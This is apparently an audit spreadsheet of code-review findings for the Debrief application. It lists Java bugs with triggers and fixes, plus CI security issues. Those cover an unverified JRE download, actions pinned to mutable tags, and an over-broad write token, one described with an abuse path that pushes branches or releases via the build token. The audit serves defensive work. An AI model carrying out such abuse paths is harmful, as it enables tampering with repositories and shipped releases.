id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-165,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateInfillSegment,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateInfillSegment.java,bug,logic-error,Medium,High,candidate,Selection validation overwritten per item; non-segment items reach unchecked ...,"In generate(), canDo is reassigned on every iteration instead of accumulated, so a non-TrackSegment earlier in the selection is masked by a later valid segment; only parentLayers[0] and [1] are compared for a common parent. execute() then casts _segments[i] to TrackSegment (L129-L130), giving ClassCastException part-way through, after some infills may already have been added.",L1032; L1035-L1042; L129-L130,"In the Outline, ctrl-click a SensorWrapper of a track and then two of that track's TMA segments, choose Generate infill segments",Use canDo &= (editable instanceof TrackSegment && !isEmpty) and check every parentLayers[i] equals parentLayers[0].,S,A reviewer has to notice the assignment inside the loop should be a conjunction.,-,
CR-166,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromCuts,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromCuts.java,bug,degenerate-input,Medium,Medium,candidate,Cuts outside host track period silently dropped; empty result NPEs in execute,"TMAfromCuts.trimToHost silently discards every cut whose DTG is outside the host track's fix period, using only cuts[0]'s host, with no message to the analyst. If all cuts fall outside (sensor data that extends beyond the positional data) _items is empty, RelativeTMASegment is empty and getTrackNameFor calls _newTrack.getStartDTG().getDate() on null. The 'selected cuts' path also passes firstContact.getRange() (possibly null) to the wizard while the 'all cuts' path defaults it to 6nm.",L666-L684; L699; L742-L749; L777-L779; L905-L907 vs L950-L951,Sensor with cuts timestamped after the last ownship fix; select those cuts -> Generate TMA solution from selected cuts -> Finish,"Report how many cuts were trimmed, abort with a message when none remain, and apply the same null-range default on both wizard paths.",S,Needs to follow the trimmed array through to the later null dereference.,-,
CR-167,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromOwnshipPositions,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromOwnshipPositions.java,bug,null-deref,Medium,Medium,candidate,items[] may contain nulls and selection order is assumed chronological,"In generate(), items[i] is only set when the fix's parent is a TrackWrapper; otherwise allGood stays true and the slot remains null, so TMAfromPositions.execute dereferences _items[0] or _items[len-1]. execute also takes start from _items[0] and end from the last item, assuming the selection array is time-ordered; a reversed order produces an inverted (empty) AbsoluteTMASegment and getStartDTG() NPE at L126-L127.",L186-L208; L114-L117; L126-L127,Select FixWrappers from a LightweightTrackWrapper (not a TrackWrapper) and run Generate TMA solution from selected positions,Set allGood=false when the parent is not a TrackWrapper; sort items by DTG before use.,S,Requires noticing the missing else branch inside the validation loop.,-,
CR-168,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTrack,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTrack.java,bug,null-deref,Medium,Medium,candidate,"Convert layer to track: undo NPE when nothing generated, null DTG fixes, Colo...","undo() iterates _newTracks which stays null when no layer yielded a track. generateTrackFor builds Fix objects with sw.getStartDTG() which may be null for LineShapes without a DTG, producing fixes with null time that break time-ordered collections later. label.getColor() != trackColor compares Colors by reference so fixes are needlessly given individual colours.",L109-L122; L230-L233; L212; L235,Layer containing a LabelWrapper without a time plus a LineShape without start/end DTG; Convert layer to track then Undo,"Guard _newTracks in undo, skip or default shapes lacking a DTG (with a warning), use equals() for colours.",S,Needs to trace when _newTracks stays null and where a null DTG ends up.,-,
CR-169,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,RainbowShadeSonarCuts,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/RainbowShadeSonarCuts.java,bug,logic-error,Medium,High,candidate,Undo of shading resets cuts to default colour instead of restoring prior colours,"ShadeCutsOperation.undo() runs CLEAR_SHADE, which calls resetColor() on every cut, so any custom colour the analyst had already applied to individual cuts (or a previous shading) is lost rather than restored. Also _delta is computed in whole seconds and execute() silently returns OK_STATUS when _delta<=0, so cuts spanning under one second are not shaded and no message is shown; hue is quantised to seconds.",L76; L102; L128-L136; L151-L154,"Manually colour three cuts red, apply Shade in rainbow colors to the sensor, then Undo",Record each cut's colour (getColor/hasCustomColor) in execute and restore in undo; compute delta in micros as double.,S,Undo-fidelity reasoning; not detectable by pattern matching.,-,
CR-170,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,RemoveTrackJumps,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/RemoveTrackJumps.java,algorithm-correctness,division-by-zero,Medium,Medium,candidate,Duplicate timestamps produce Infinity/NaN offsets that are applied to positions,"Leg() divides by (jumpTime - prevTime) and offsetFor divides by (endTime - startTime); two fixes with identical DTGs give Infinity/NaN range in the offset vector which applyOffsets then adds to every fix location in the leg, silently corrupting positions (undo still works since originals are stored). getLegs also calls iter.next() on a possibly empty collection and generate casts every subject to FixWrapper when only the first was checked.",L97-L101; L127-L129; L240; L284; L372,Track segment where two consecutive fixes share the same DTG followed by a speed jump; Remove jumps for selected track,"Skip legs with zero time delta (or report), guard empty collections, and validate all subjects are FixWrappers.",S,Requires following the ratio into WorldVector construction and setLocation.,-,
CR-171,A10,org.mwc.debrief.core,org.mwc.debrief.core.loaders,CoreLoader,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/CoreLoader.java,bug,swallowed-exception,Medium,High,candidate,All import failures logged then 'Successfully loaded' reported; suspend flag ...,"loadFile catches InvocationTargetException/InterruptedException/IOException/Exception, logs them, then unconditionally logs 'Successfully loaded ... file' and calls listener.complete(), so a corrupt file appears to succeed to callers and the log. layers.suspendFiringExtended(false) is called before the import (evidently meant to be true) so nothing is suspended and finally resets the same flag; if target has no Layers adapter, layers is null and the finally block NPEs.",L76; L82; L88-L102,Any .rep that makes ImportReplay throw (e.g. truncated line) opened via the plot editor,"Track success in a boolean, only log success and call complete on success, pass true to suspendFiringExtended, and null-check layers.",S,grep-able,-,
CR-172,A11,.github,-,codeql-analysis.yml,.github/workflows/codeql-analysis.yml,ci-workflow,dead-code,Medium,High,verified,"CodeQL workflow is disabled and could not run anyway (v1 actions, Autobuild v...","The GitHub Actions API reports this workflow's state as `disabled_inactivity` (last update 2022-11-24) with zero runs, so no CodeQL analysis has happened for years despite the file suggesting otherwise. Even re-enabled it would fail: github/codeql-action/init@v1, autobuild@v1 and analyze@v1 (L45, L56, L70) were removed by GitHub in January 2023, actions/checkout@v2 (L41) is Node 12 and deprecated, and Autobuild runs `mvn package` on `ubuntu-latest` with no setup-java (Tycho needs Java 11 and the win-64 JRE staging performed in main.yml), so the Java matrix entry would produce no database.",L26; L41; L45; L56; L70,Actions API: GET /repos/debrief/debrief/actions/workflows/codeql-analysis.yml -> state=disabled_inactivity; list runs -> total_count 0.,"Upgrade to codeql-action@v3 and checkout@v4, replace Autobuild with `build-mode: none` for Java (or an explicit setup-java 11 + `mvn -B -DskipTests package`), re-enable the workflow, and add it as a required check; or delete the file if CodeQL is not wanted.",M,"Confirming the workflow is inert required querying the live Actions state and reasoning about Autobuild against a Tycho build, not just reading the YAML.",-,
CR-173,A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,ssrf-or-unvalidated-url,Medium,High,candidate,Bundled Windows JRE zip is downloaded without any checksum verification,L156-157 `wget -q -O ... https://github.com/AdoptOpenJDK/openjdk11-binaries/releases/download/...zip` and contribs/msi/make_x64msi.sh L26 do the same; the archive is then unpacked straight into the shipped product (L166-169). No SHA-256 is checked although AdoptOpenJDK publishes one. Integrity rests entirely on TLS to github.com and on the (archived) AdoptOpenJDK org's release assets never being replaced; the result is cached for the lifetime of key `win-jre-11.0.5-10` (L150) so a single poisoned download persists across every build.,L152-157; L166-169; contribs/msi/make_x64msi.sh L26-28,Compromise or takeover of the archived AdoptOpenJDK/openjdk11-binaries release asset; every subsequent Windows release bundles it.,Download the matching .sha256.txt and run `sha256sum -c` before unzip; include the hash in the cache key.,S,grep-able.,-,
CR-174,A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,outdated-dependency,Medium,High,candidate,Third-party actions referenced by mutable tags; xvfb-action wraps the whole b...,"Every `uses:` is a floating major tag rather than a commit SHA: GabrielBB/xvfb-action@v1 (L176) runs the entire `mvn clean verify` and is an archived, unmaintained repository; softprops/action-gh-release@v2 (L311) receives the contents:write GITHUB_TOKEN and decides what is published; andstor/file-existence-action@v1 (L218) and bcomnes/cleanup-xvfb@v1 (L327) are small personal actions. A moved tag (as in the tj-actions/changed-files incident, CVE-2025-30066) executes attacker code inside the release job.",L55; L121; L123; L136; L147; L176; L184; L218; L254; L262; L270; L292; L311; L327,Upstream maintainer account compromise moves the `v1`/`v2` tag; next tag build publishes tampered assets.,Pin every action to a full commit SHA with a version comment and enable Dependabot `github-actions` updates; replace xvfb-action with `xvfb-run -a mvn ...` (xvfb is already apt-installed at L117) so no third-party action wraps the build.,S,"grep-able, though judging which actions sit on the privileged path needs the workflow read.",CVE-2025-30066,
CR-175,A11,.github,-,main.yml,.github/workflows/main.yml,ci-workflow,workflow-permissions,Medium,High,candidate,"contents:write granted to the build job on every event, not just tag releases","L88-89 `permissions: contents: write` applies to the whole `buildandrelease` job for push, pull_request and workflow_dispatch alike, yet only the `Upload release` step (L310-324) needs it. On a same-repository branch PR or a workflow_dispatch of any branch, the untrusted-ish `mvn clean verify` (L174-179, which executes every module's antrun/pom logic) runs with a token able to push branches, move tags and create releases. Combined with `on.push.tags: '*'` (L15-16), any actor able to push a `YYYYMMDD_N_N_N` tag publishes a public release with RELEASE_NOTES.md as body (L303-316); the file relies on repository tag-protection rules that cannot be seen from the repo.",L15-16; L26-27; L88-89; L174-179; L303-324,workflow_dispatch on a feature branch whose pom adds an antrun `<exec>` that uses $ACTIONS_RUNTIME_TOKEN/GITHUB_TOKEN to `git push origin HEAD:develop` or create a release.,"Keep the job at `contents: read`, move the release upload into a separate `release` job with `needs: build`, `if: startsWith(github.ref,'refs/tags/')` and its own `permissions: contents: write`, consuming the product zips via upload/download-artifact; add a tag protection ruleset for `????????_*`.",M,Needs reasoning about which steps actually consume the permission and about the event matrix; a linter only flags missing permissions blocks.,-,
